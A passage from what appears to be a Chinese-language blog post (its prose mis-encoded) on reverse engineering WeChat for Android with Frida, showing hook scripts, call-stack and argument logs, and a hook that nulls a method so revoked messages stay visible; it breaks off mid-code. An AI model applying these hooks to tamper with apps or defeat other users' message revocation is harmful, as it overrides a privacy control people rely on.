class="line">        <span class="keyword">var</span> threadinstance = threadef.$new();</span><br><span class="line">        <span class="keyword">var</span> stack = threadinstance.<span class="title function_">currentThread</span>().<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Where</span>(<span class="params">stack</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stack.<span class="property">length</span>; ++i)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stack[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full call stack:&quot;</span> + <span class="title class_">Where</span>(stack));    </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°ç»“æœå¦‚ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.msgquote</span><span class="selector-class">.PluginMsgQuote</span><span class="selector-class">.handleRevokeMsgBySvrId</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2190</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">193</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å‡ºå¦‚ä¸‹è„šæœ¬(çŒœæµ‹åº”è¯¥æ˜¯å‘é€æ¶ˆæ¯å’Œæ’¤å›æ¶ˆæ¯ç»è¿‡çš„è°ƒç”¨æ ˆä¼šæœ‰æ‰€åŒºåˆ«ï¼Œè¿™é‡ŒåŒºåˆ†å“ªé‡Œæ˜¯å¤„ç†æ’¤å›æ¶ˆæ¯çš„æ–¹æ³•)</p><p>ä¸‹é¢ ä»£ç åŠŸèƒ½å°±æ˜¯æ‰“å°ä¸Šé¢å¯èƒ½è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.msgquote.PluginMsgQuote&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;8 handleRevokeMsgBySvrId&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">handleRevokeMsgBySvrId</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.s.b&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5 b.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">processAddMsg</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;4 c.processAddMsg()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">processAddMsg</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.zero.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å¯¹æ–¹æ’¤å›æ¶ˆæ¯æ‰“å°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]</span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br><span class="line"><span class="symbol">5 </span>b.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">6 </span>ch.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">7 </span>f.a() arguments: [<span class="number">0</span>]revokemsg [<span class="number">1</span>][object Object] [<span class="number">2</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">8 </span>handleRevokeMsgBySvrId arguments: [<span class="number">0</span>]<span class="number">3286380964546034700</span></span><br></pre></td></tr></table></figure><p>å¯¹æ–¹å‘é€æ¶ˆæ¯æ‰“å°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]        </span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">21726955</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br></pre></td></tr></table></figure><p>å‘ç°ç¡®å®æœ‰æ‰€åŒºåˆ«ï¼Œä»processAddMsg()æ–¹æ³•å¼€å§‹å°±ä¸ä¸€æ ·äº†ï¼Œæ‰€ä»¥processAddMsg()æ–¹æ³•ç®—æ˜¯ä¸€ä¸ªå…³é”®ï¼Œå¦‚æœåˆ¤æ–­æ˜¯æ’¤å›æ¶ˆæ¯ç»§ç»­å‘ä¸‹é¢æ‰§è¡Œï¼Œå¦‚æœä¸æ˜¯æ’¤å›æ¶ˆæ¯å°±åœåœ¨processAddMsg()æ–¹æ³•äº†ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•çœ‹çœ‹å†…å®¹ã€‚</p><p><code>com.tencent.mm.plugin.messenger.foundation.c.processAddMsg</code>ï¼ŒæŒ‰ç…§ä¸Šé¢æ‰“å°çš„è°ƒç”¨æ ˆï¼Œä¸‹é¢å¯èƒ½ä¼šæ‰§è¡Œåˆ°<code>com.tencent.mm.s.b.b</code>æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨processAddMsg()æ–¹æ³•ä¸­æ‰¾åˆ°å¦‚ä¸‹ä½ç½®ï¼š</p><p><img src="/posts/5324751f.htm/image-20240611155113284.png" alt="image-20240611155113284"></p><p>å‘ç°æ˜¯å¦è¿›å…¥ä¸‹ä¸€ä¸ªæ–¹æ³•com.tencent.mm.s.b.bå…³é”®æ˜¯bkå€¼ï¼Œè€Œbkå€¼å¥½åƒæ˜¯å—åˆ°</p><p>**com.tencent.mm.ak.e bK = e.d.bK(Integer.valueOf(cvVar.vkP))**å½±å“ï¼Œè¿™é‡Œå¯ä»¥å…³æ³¨ä¸€ä¸‹cvVar.vkPå€¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_vkp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> vkP = obj.<span class="property">vkP</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(vkP);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹æ–¹å‘é€æ¶ˆæ¯ å€¼ä¸º1</span></span><br><span class="line"><span class="comment">//å¯¹æ–¹æ’¤å›æ¶ˆæ¯ å€¼ä¸º10002</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥çŒœæµ‹æ ¹æ®è¿™ä¸ªå€¼æ¥åˆ¤æ–­æ˜¯å¦æ˜¯æ’¤å›æ¶ˆæ¯ï¼Œæ˜¯å¦è¦è¿›å…¥com.tencent.mm.s.b.bè¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚</p><p>å› ä¸ºè¦å¤„ç†é˜²æ’¤å›æ“ä½œï¼Œæ‰€ä»¥è¿›å…¥<code>com.tencent.mm.s.b.b</code></p><p><img src="/posts/5324751f.htm/image-20240611160534331.png" alt="image-20240611160534331"></p><p>è¿™é‡Œæœ‰ä¸ªç¥å¥‡çš„åœ°æ–¹ï¼Œå› ä¸º<code>com.tencent.mm.s.b.b</code>æ–¹æ³•ä¹‹åéƒ½æ˜¯å¤„ç†æ’¤å›æ¶ˆæ¯çš„å‡½æ•°æ“ä½œï¼ŒæŠŠè¿™é‡Œç›´æ¥è¿”å›ç©ºæ˜¯ä¸æ˜¯å°±ä¸èƒ½æ‰§è¡Œæ’¤å›æ¶ˆæ¯çš„æ“ä½œäº†â€¦</p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook com.tencent.mm.s.b.b å®ç°è¿”å›ç©º åˆ™ä¸ä¼šæ‰§è¡Œååºçš„æ’¤å›æ“ä½œ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_bb</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.s.b&quot;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æµ‹è¯•å‘ç°å¯¹æ–¹ç¡®å®ä¸èƒ½æ’¤å›æ¶ˆæ¯äº† ä½†æ˜¯æ²¡æœ‰æ’¤å›æç¤º xxxæ’¤å›ä¸€æ¡æ¶ˆæ¯</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥ä¸‹ä¸€ä¸ªæ–¹æ³•çœ‹çœ‹</p><p><code>com.tencent.mm.model.ch.b</code></p><p><img src="/posts/5324751f.htm/image-20240611161159927.png" alt="image-20240611161159927"></p><p>å‘ç°è¿™é‡Œåˆå¯¹vkPè¿›è¡Œäº†switchåˆ¤æ–­ï¼ŒvkP==10002,æ‰€ä»¥è¿™é‡Œä¸»è¦æ‰§è¡Œcase 10002ï¼›</p><p><img src="/posts/5324751f.htm/image-20240611162654619.png" alt="image-20240611162654619"></p><p>å‘ç°ä¸»è¦æ˜¯å¯¹a2å†…å®¹è¿›è¡Œåˆ¤æ–­æ“ä½œã€‚a2=cvVar.GYI.IYzï¼Œè¿™é‡Œå°±jsonåŒ–è¾“å‡ºcvVar.GYIï¼Œç„¶åcvVar.GYIä½œä¸ºå‚æ•°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•</p><p><img src="/posts/5324751f.htm/image-20240611164521216.png" alt="image-20240611164521216"></p><p>å¯ä»¥æ‰“å°ä¸€ä¸‹deoVar.ITzçœ‹çœ‹å†…å®¹ï¼Œå› ä¸ºcase 10002éƒ½æ˜¯å¯¹å…¶å†…å®¹è¿›è¡Œåˆ¤æ–­æ“ä½œã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 